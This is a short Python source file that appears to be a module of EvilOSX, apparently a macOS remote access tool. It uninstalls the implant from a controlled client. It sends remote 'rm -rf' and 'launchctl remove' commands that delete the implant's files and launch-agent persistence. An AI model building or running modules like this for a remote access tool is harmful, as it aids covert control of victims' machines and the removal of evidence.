from helpers import *


class Module:
    """This module removes EvilOSX from the client."""

    def __init__(self):
        self.info = {
            "Author": ["Marten4n6"],
            "Description": "Removes EvilOSX from the client."
        }

    def setup(self):
        confirm = raw_input(MESSAGE_INPUT + "Are you sure you want to remove this client? [Y/n] ").lower()

        if not confirm or confirm == "y":
            print MESSAGE_INFO + "Removing client..."
            return True
        else:
            print MESSAGE_INFO + "Cancelled."
            return False

    def run(self):
        return """\        
        run_command("rm -rf " + get_program_directory())
        run_command("rm -rf " + get_launch_agent_file())
        run_command("launchctl remove " + LAUNCH_AGENT_NAME)
        sys.exit(0)
        """
